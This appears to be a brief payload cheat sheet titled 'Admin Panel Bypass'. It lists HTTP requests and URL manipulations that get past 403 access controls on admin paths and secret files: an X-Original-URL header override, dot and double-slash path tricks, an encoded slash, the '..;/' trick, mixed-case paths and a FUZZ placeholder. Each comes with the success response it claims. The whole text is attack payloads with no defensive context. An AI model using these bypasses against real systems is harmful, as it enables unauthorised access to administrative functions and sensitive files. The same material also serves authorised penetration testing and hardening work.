# Admin Panel Bypass
```
GET /admin HTTP/1.1
Host: web.com ====> 403 Forbidden

GET /anything HTTP/1.1
Host: web.com
X-Original-URL: /admin ====> 200 ok

/admin/panel ====> 403 Forbidden
/admin/monitor ====> 200 ok
/admin/monitor/;panel ====> 302 Found

abc.com/admin ====> 403 Forbidden
abc.com/admin/. ====> 200 ok
abc.com//admin// =====> 200 ok
abc.com/./admin/./ ====> 200 ok
abc.com/secret.txt/ ====> 403
abc.com/%2f/secret.txt/ ====> 200 ok

https://abc.com/admin ===> 302
https://abc.com/admin..;/ ===> 200 ok

sub.abc.com/web/admin/ ====> 302
sub.abc.com/web/aDmiN/ ====> 200 ok
sub.abc.com/ web/ aDmiN/FUZZ ====> Sensitive Files
```